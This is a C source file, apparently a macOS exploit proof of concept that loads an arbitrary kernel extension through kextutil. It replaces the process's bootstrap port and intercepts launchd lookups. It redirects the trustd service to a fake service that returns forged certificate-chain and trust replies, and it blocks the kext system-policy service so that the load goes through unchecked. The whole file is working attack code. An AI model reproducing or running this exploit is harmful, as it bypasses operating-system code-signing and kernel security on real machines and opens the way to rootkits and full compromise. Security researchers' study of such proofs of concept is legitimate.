#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>
#include <bootstrap.h>

#include <errno.h>
#include "spc.h"
#include "certs.h"

#define TARGET_SERVICE "com.apple.trustd"
// If kextutil can't reach the following service, it will just assume that the kext is fine to
// load according to system policy...
#define BLOCKED_SERVICE_NAME "com.apple.security.syspolicy.kext"
#define SERVICE_NAME "net.saelo.khax"

// Need to declare this since it's not included in bootstrap.h
extern kern_return_t bootstrap_register2(mach_port_t bp, name_t service_name, mach_port_t sp, int flags);

mach_port_t bootstrap_port, fake_bootstrap_port, fake_service_port, real_service_port;
pthread_t fake_service_thread, spoofer_thread;

void get_bootstrap_port()
{
    kern_return_t kr = task_get_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, &bootstrap_port);
    ASSERT_MACH_SUCCESS(kr, "task_get_special_port");
}

void* spoof_replies(void* arg)
{
    spc_connection_t* bridge = arg;
    while (1) {
        spc_message_t* msg = spc_recv(bridge->receive_port);
        spc_dictionary_destroy(msg->content);

        // Hack 3: ...
        spc_dictionary_t* reply = spc_dictionary_create();

        spc_array_t* certchain = spc_array_create();
        spc_array_set_data(certchain, 0, cert0, cert0_len);
        spc_array_set_data(certchain, 1, cert1, cert1_len);
        spc_array_set_data(certchain, 2, cert2, cert2_len);
        spc_value_t value;
        value.type = SPC_TYPE_ARRAY;
        value.value.array = certchain;
        spc_dictionary_set_value(reply, "chain", value);
        spc_dictionary_set_int64(reply, "result", 1);
        spc_dictionary_set_data(reply, "details", "\x30\x02\x31\x00", 4);
        spc_dictionary_set_data(reply, "info", "\x31\x00", 2);

        msg->remote_port.name = msg->local_port.name;
        msg->remote_port.type = MACH_MSG_TYPE_MOVE_SEND_ONCE;
        msg->local_port.name = MACH_PORT_NULL;
        msg->local_port.type = 0;
        msg->id = 0x20000000;
        msg->content = reply;

        spc_send(msg);

        spc_message_destroy(msg);
    }

    return NULL;
}

void* fake_service_main(void* arg)
{
    int ret;

    // Await incoming connection
    spc_connection_t* client_connection = spc_accept_connection(fake_service_port);
    spc_connection_t* service_connection = spc_create_connection_mach_port(real_service_port);

    spc_connection_t* bridge_1 = malloc(sizeof(spc_connection_t));
    spc_connection_t* bridge_2 = malloc(sizeof(spc_connection_t));

    bridge_1->receive_port = client_connection->receive_port;
    bridge_1->send_port    = service_connection->send_port;
    bridge_2->receive_port = service_connection->receive_port;
    bridge_2->send_port    = client_connection->send_port;

    ret = pthread_create(&spoofer_thread, NULL, &spoof_replies, bridge_1);
    ASSERT_POSIX_SUCCESS(ret, "pthread_create");

    free(client_connection);
    free(service_connection);

    return NULL;
}

void start_fake_service()
{
    kern_return_t kr;

    // Resolve real service port for later
    kr = bootstrap_look_up(bootstrap_port, TARGET_SERVICE, &real_service_port);
    ASSERT_MACH_SUCCESS(kr, "bootstrap_look_up");

    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fake_service_port);
    ASSERT_MACH_SUCCESS(kr, "mach_port_allocate");

    kr = bootstrap_register2(bootstrap_port, SERVICE_NAME, fake_service_port, 0);
    ASSERT_MACH_SUCCESS(kr, "bootstrap_register2");

    // Run the fake service in a separate thread
    int ret = pthread_create(&fake_service_thread, NULL, &fake_service_main, NULL);
    ASSERT_POSIX_SUCCESS(ret, "pthread_create");
}

void setup_fake_bootstrap_port()
{
    kern_return_t kr;
    mach_port_t fake_bootstrap_send_port;

    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fake_bootstrap_port);
    ASSERT_MACH_SUCCESS(kr, "mach_port_allocate");

    mach_msg_type_name_t aquired_type;
    kr = mach_port_extract_right(mach_task_self(), fake_bootstrap_port, MACH_MSG_TYPE_MAKE_SEND, &fake_bootstrap_send_port, &aquired_type);
    ASSERT_MACH_SUCCESS(kr, "mach_port_allocate");

    // Hack 1: replace the bootstrap port of this and all child processes with our own port
    kr = task_set_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, fake_bootstrap_send_port);
    ASSERT_MACH_SUCCESS(kr, "task_set_special_port");
}

void handle_sigchld()
{
    exit(0);
}

void spawn_child(const char* kext)
{
    pid_t pid = fork();
    if (pid == 0) {
        int err = execl("/usr/bin/kextutil", "/usr/bin/kextutil", kext, NULL);
        ASSERT_POSIX_SUCCESS(errno, "execl");
    } else if (pid < 0) {
        ASSERT_POSIX_SUCCESS(errno, "fork");
    }

    struct sigaction sa;
    sa.sa_handler = &handle_sigchld;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
    if (sigaction(SIGCHLD, &sa, 0) == -1) {
      printf("sigaction failed\n");
      exit(-1);
    }
}

void bridge_launchd_connection()
{
    // For launchd messages, libxpc checks that the reply comes from pid 1 and uid 0.
    // As such, we have to let launchd send the replies directly to our child process.
    // However, we can manipulate the messages sent to launchd and can thus resolve
    // services to different (controlled) ports.

    while (1) {
        // Wait for the next bootstrap message from a child process.
        spc_message_t* msg = spc_recv(fake_bootstrap_port);

        // Rewrite source (our child process) and destination (real launchd) of message.
        msg->local_port.name = msg->remote_port.name;
        msg->local_port.type = MACH_MSG_TYPE_MOVE_SEND_ONCE;
        msg->remote_port.name = bootstrap_port;
        msg->remote_port.type = MACH_MSG_TYPE_COPY_SEND;

        // Possibly modify the message before forwarding to launchd
        if (spc_dictionary_get_send_port(msg->content, "domain-port") == fake_bootstrap_port) {
            // Must replace our fake bootstrap port in the content of the message with the real one.
            spc_dictionary_set_send_port(msg->content, "domain-port", bootstrap_port);
        }
        if (spc_dictionary_get_string(msg->content, "name")) {
            if (strcmp(spc_dictionary_get_string(msg->content, "name"), TARGET_SERVICE) == 0) {
                // Hack 2: resolve the target service to our fake service instead >:)
                spc_dictionary_set_string(msg->content, "name", SERVICE_NAME);

                // Must also change a few of the other fields of the message...
                spc_dictionary_set_uint64(msg->content, "flags", 0);
                spc_dictionary_set_uint64(msg->content, "subsystem", 5);
                spc_dictionary_set_uint64(msg->content, "routine", 207);
                spc_dictionary_set_uint64(msg->content, "type", 7);
            } else if (strcmp(spc_dictionary_get_string(msg->content, "name"), BLOCKED_SERVICE_NAME) == 0) {
                spc_dictionary_set_string(msg->content, "name", "net.saelo.lolno");
            }
        }

        // Forward to launchd
        spc_send(msg);

        spc_message_destroy(msg);
    }
}

int main(int argc, char** argv)
{
    if (argc < 2) {
        printf("Usage: %s path/to/kext\n", argv[0]);
        return 0;
    }

    printf("Loading %s into the kernel...\n", argv[1]);

    get_bootstrap_port();
    start_fake_service();
    setup_fake_bootstrap_port();
    spawn_child(argv[1]);
    bridge_launchd_connection();

    return 0;
}
